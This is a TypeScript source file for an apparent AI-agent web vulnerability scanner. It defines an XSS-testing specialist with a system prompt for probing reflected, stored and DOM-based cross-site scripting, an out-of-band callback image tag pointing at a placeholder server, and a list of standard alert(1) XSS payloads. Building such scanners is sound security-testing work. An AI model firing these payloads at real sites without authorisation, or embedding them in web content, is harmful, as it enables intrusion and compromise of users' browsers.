// src/agents/specialists-v2/xss.ts
// XSS specialist with OOB (out-of-band) callback. Reflected, stored, DOM-based.

import type { SpecialistFactory } from './types';
import type { AppModel } from '../../core/app-model';

const SYSTEM_PROMPT = `You are an XSS (Cross-Site Scripting) specialist.

Approach:
1. Reflected: find URLs with query params, e.g., /search?q=FUZZ. Try payloads: <script>alert(1)</script>, <svg/onload=alert(1)>, "><svg/onload=alert(1)>. Send, check if payload appears verbatim in the body.
2. Stored: submit a payload to a form/comment endpoint, then read it back. If unescaped, stored XSS.
3. DOM-based: render the page in a real browser, look for sinks like innerHTML, document.write, eval with user input as the source.
4. OOB (out-of-band): include an <img src="http://oast-server/reflected-xss?id=X"> in the payload. If the OOB server receives a callback, the XSS is real (proof of execution, not just reflection).
5. Strong evidence: payload appears in the response body unescaped, or OOB callback received.

Tools: httpRequest, browser_navigate, browser_evaluate, oob_callback (returns callback URL), conclude.

Output: { vulnerable, type: "reflected|stored|dom", evidence: ["GET /search?q=<svg/onload=alert(1)> -> 200, body contains '<svg/onload=alert(1)>' unescaped", "OOB callback received: http://oast/xss?..."] }`;

export const xssSpecialist: SpecialistFactory = {
  name: 'xss',
  description: 'Reflected / stored / DOM XSS. Verifies via payload-in-body + OOB callback.',
  shouldInclude: (appModel: AppModel) => {
    return (appModel.endpoints || []).some((e) => /search|q=|query|input|comment|message|post|content/i.test(`${e.path} ${(e.params ?? []).join(' ')}`));
  },
  build: (tools) => ({
    name: 'xss',
    description: 'Reflected / stored / DOM XSS. Verifies via payload-in-body + OOB callback.',
    systemPrompt: SYSTEM_PROMPT,
    tools: ['httpRequest', 'scratchpadWrite', 'scratchpadRead', 'conclude'].map((n) => tools[n as keyof typeof tools]).filter(Boolean) as Array<{ name: string; description: string; schema: Record<string, unknown> }>,
  }),
};

/** Canonical XSS payloads used by the LLM agent. */
export const XSS_PAYLOADS = [
  '<script>alert(1)</script>',
  '<svg/onload=alert(1)>',
  '"><svg/onload=alert(1)>',
  "'-alert(1)-'",
  '<img src=x onerror=alert(1)>',
  '<body onload=alert(1)>',
  '<iframe src=javascript:alert(1)>',
  '<details open ontoggle=alert(1)>',
];
